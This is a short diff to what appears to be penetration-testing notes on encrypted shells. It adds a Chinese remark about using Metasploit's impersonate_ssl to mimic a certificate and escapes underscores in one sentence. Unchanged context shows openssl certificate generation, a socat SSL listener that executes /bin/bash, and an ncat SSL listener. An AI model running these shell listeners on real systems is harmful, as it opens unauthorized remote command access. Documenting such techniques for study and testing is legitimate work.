@@ -2,7 +2,7 @@
 
 ```
 openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
-
+这个pem文件也可以用msf 的impersonate_ssl快速自签名模仿
 cat shell.key shell.crt > shell.pem
 
 sudo socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork EXEC:/bin/bash
@@ -53,5 +53,5 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port 7002
 ncat --ssl -nvlp 443
 ```
 
-To do so, we combine both the bind_shell.key and bind_shell.crt files into a single .pem file before we create the encrypted socat listener.
+To do so, we combine both the bind\_shell.key and bind\_shell.crt files into a single .pem file before we create the encrypted socat listener.
 
